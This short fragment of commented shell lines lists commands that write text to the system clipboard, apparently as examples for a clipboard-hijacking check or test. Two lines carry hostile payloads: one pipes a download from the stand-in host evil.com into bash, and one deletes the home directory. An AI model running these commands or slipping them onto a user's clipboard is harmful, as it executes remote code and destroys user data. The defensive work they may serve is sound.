  #   echo 'curl evil.com | bash' | pbcopy
  #   printf 'rm -rf ~\n' | xclip -selection clipboard
  #   echo 'payload' | wl-copy
  #   git log --oneline | head -1 | pbcopy
  #   echo 'evil' | clip.exe
  #   echo 'evil' | xsel -bi
